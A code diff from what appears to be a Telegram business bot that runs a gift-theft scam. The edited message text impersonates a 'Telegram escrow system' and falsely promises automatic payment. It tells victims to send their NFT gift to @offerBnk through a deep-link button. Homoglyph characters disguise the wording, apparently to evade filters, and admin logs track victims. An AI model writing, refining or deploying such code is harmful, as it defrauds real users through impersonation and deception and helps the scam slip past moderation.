@@ -68,7 +68,7 @@ def format_gift_name(slug: str, number: str) -> str:
     return f"{formatted_slug} #{number}"
 
 # ============================================================
-# ЛОГИ ДЛЯ АДМИНА
+# ЛОГИ ДЛЯ АДМИНА (НОВЫЕ)
 # ============================================================
 async def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
     status_map = {
@@ -209,6 +209,7 @@ async def handle_offer(message: Message) -> None:
     sender_id = message.from_user.id if message.from_user else 0
     sender_username = message.from_user.username if message.from_user else None
 
+    # Проверка на /start
     if sender_id not in started_users:
         logger.warning(f"[offer] User {sender_id} not started, deleting message.")
         try: await bot.delete_business_messages(business_connection_id=str(bc_id), message_ids=[message.message_id])
@@ -293,19 +294,16 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
     accept_text = (
-        f"<b>NFТ Dеаl</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
+        f"<b>NFТ DеаI</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
         f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
-        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
-        f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
-        f"1. Sеnd tо: @offerBnk\n"  # <--- ИЗМЕНЕНО ТУТ
-        f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
+        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wiII bе аutоmаtiсаIIу сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
+        f"<b>lnstruсtlоns tо соmрlеtе thе dеаI:</b>\n\n"
+        f"1. Stnd tо: @offerBnk\n"
+        f"2. СIiсk «Sеnd Gift» аnd sеIесt {gift_display}\n"
         f"3. Соnfirm thе glft trаnsfеr.\n\n"
-        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
+        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаIid fоr 24 hоurs."
     )
-    
-    # Тут получатель @offerBnk
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
-    
     await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], accept_text, reply_markup=keyboard)
     await update_log_message(data, "accepted", is_read=True)
 
